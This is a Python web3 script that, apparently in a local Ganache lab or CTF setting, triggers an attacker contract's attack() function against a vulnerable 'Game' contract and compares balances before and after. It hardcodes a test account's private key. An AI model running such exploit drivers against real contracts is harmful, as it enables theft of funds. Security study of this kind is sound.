import argparse, json
from web3 import Web3

address_one = "0x7a52E1A7e0ca1C863FC9C476Ff6F27545E619C2e"
address_one_key = "0x3e5146d9872998bb404ad910ac9bd7e7dec397be57580f2d0284e8c92e69e71b"

def get_balance(client, address):
    return client.eth.getBalance(address)

def main():
    
    attacker = json.load(open('AttackGame.json'))
    vuln = json.load(open('Game.json'))

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    ganache_client = Web3(Web3.HTTPProvider(f"http://{args.host}"))

    vuln_current_balance =  int(Web3.fromWei(get_balance(ganache_client, vuln['Contract Address']), 'ether'))
    attacker_current_balance =  int(Web3.fromWei(get_balance(ganache_client, address_one), 'ether'))
    print( "*" * 10, "Current Balance", "*" * 10)
    print({"Contract Balance": vuln_current_balance, "Attack Balance": attacker_current_balance})
    print( "*" * 10, "Current Balance", "*" * 10)

    contract_instance = ganache_client.eth.contract(address=attacker['Contract Address'], abi=attacker['Contract ABI'])
    transaction = contract_instance.functions.attack(vuln['Contract Address']).buildTransaction(
        {
            "gasPrice": ganache_client.eth.gas_price,
            "chainId": 1337,
            "value": Web3.toWei(5, "ether"),
            "from": address_one,
            "nonce": ganache_client.eth.getTransactionCount(address_one)
        }
    )
    signed_transaction = ganache_client.eth.account.sign_transaction(transaction, private_key = address_one_key)
    transaction_hash = ganache_client.eth.send_raw_transaction(signed_transaction.rawTransaction)
    transaction_receipt = ganache_client.eth.wait_for_transaction_receipt(transaction_hash)

    vuln_contract_instance = ganache_client.eth.contract(address=vuln['Contract Address'], abi=vuln['Contract ABI'])
    vuln_now_balance =  int(Web3.fromWei(get_balance(ganache_client, vuln['Contract Address']), 'ether'))
    attacker_now_balance =  int(Web3.fromWei(get_balance(ganache_client, address_one), 'ether'))
    winner = vuln_contract_instance.functions.winner().call()
    print( "*" * 10, "Current Balance", "*" * 10)
    print({"Contract Balance": vuln_now_balance, "Attack Balance": attacker_now_balance, "Winner": winner})
    print( "*" * 10, "Current Balance", "*" * 10)

if __name__ == "__main__":

    main()

